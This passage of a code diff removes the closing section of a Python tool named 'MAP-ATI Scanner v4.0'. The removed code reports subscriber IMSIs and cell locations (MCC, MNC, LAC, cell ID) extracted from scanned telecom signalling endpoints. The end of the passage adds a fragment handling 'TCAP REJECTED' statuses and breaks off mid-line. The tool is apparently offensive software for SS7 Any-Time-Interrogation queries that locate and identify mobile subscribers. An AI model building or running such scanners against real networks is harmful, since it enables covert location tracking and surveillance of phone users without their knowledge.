-                                        Colors.CYAN)
-                        
-                except Exception as exc:
-                    logger.error(f"Professional task exception for {task_def['ip']}:{task_def['port']}: {exc}")
-        
-        # Display professional final statistics
-        display_professional_final_statistics()
-        
-        # Professional summary of significant findings
-        full_info_results = [r for r in all_results if r.location_info.cgi_found and r.subscriber_info.imsi != "N/A"]
-        cgi_results = [r for r in all_results if r.location_info.cgi_found]
-        imsi_results = [r for r in all_results if r.subscriber_info.imsi != "N/A"]
-        
-        if full_info_results:
-            print_colored(f"\n🎯 FULL INFORMATION EXTRACTIONS ({len(full_info_results)}):", Colors.BRIGHT_GREEN, bold=True)
-            for result in full_info_results[:5]:
-                print_colored(f"   {result.ip}:{result.port} - CGI: {result.location_info.mcc}-{result.location_info.mnc}-{result.location_info.lac}-{result.location_info.cell_id}, IMSI: {result.subscriber_info.imsi}", Colors.BRIGHT_GREEN)
-            if len(full_info_results) > 5:
-                print_colored(f"   ... and {len(full_info_results) - 5} more complete extractions", Colors.BRIGHT_GREEN)
-        
-        if cgi_results:
-            print_colored(f"\n📍 LOCATION EXTRACTIONS ({len(cgi_results)}):", Colors.GREEN, bold=True)
-            for result in cgi_results[:8]:
-                print_colored(f"   {result.ip}:{result.port} - MCC:{result.location_info.mcc}, MNC:{result.location_info.mnc}, LAC:{result.location_info.lac}, CI:{result.location_info.cell_id}", Colors.GREEN)
-            if len(cgi_results) > 8:
-                print_colored(f"   ... and {len(cgi_results) - 8} more location extractions", Colors.GREEN)
-        
-        if imsi_results:
-            print_colored(f"\n📱 SUBSCRIBER EXTRACTIONS ({len(imsi_results)}):", Colors.BRIGHT_CYAN, bold=True)
-            for result in imsi_results[:6]:
-                print_colored(f"   {result.ip}:{result.port} - IMSI: {result.subscriber_info.imsi}", Colors.CYAN)
-            if len(imsi_results) > 6:
-                print_colored(f"   ... and {len(imsi_results) - 6} more subscriber extractions", Colors.CYAN)
-        
-        print_colored(f"\n✅ Professional scan completed successfully!", Colors.BRIGHT_GREEN, bold=True)
-        print_colored(f"📂 Professional results saved to: {results_dir.resolve()}", Colors.GREEN)
-        
-        logger.info("Professional MAP-ATI Scanner v4.0 completed successfully")
-        
-    except KeyboardInterrupt:
-        print_colored("\n\n⚠️ Professional scan interrupted by user", Colors.YELLOW, bold=True)
-        logger.info("Professional scan interrupted by user")
-        display_professional_final_statistics()
-    except Exception as e:
-        print_colored(f"\n\n❌ Professional scan failed with error: {e}", Colors.RED, bold=True)
-        logger.error(f"Professional scan failed: {e}", exc_info=True)
-        display_professional_final_statistics()
-
-if __name__ == "__main__":
-    if sys.version_info < (3, 7):
-        print_colored("❌ This professional script requires Python 3.7+.", Colors.RED, bold=True)
-        sys.exit(1)
-    
-    try:
-        main()
-    except Exception as e:
-        print_colored(f"❌ Professional fatal error: {e}", Colors.RED, bold=True)
-        sys.exit(1)
+        status_text = "TCAP REJECTED"
+        status_bg = Colors.BG_RED
+    elif 'Abort' in result
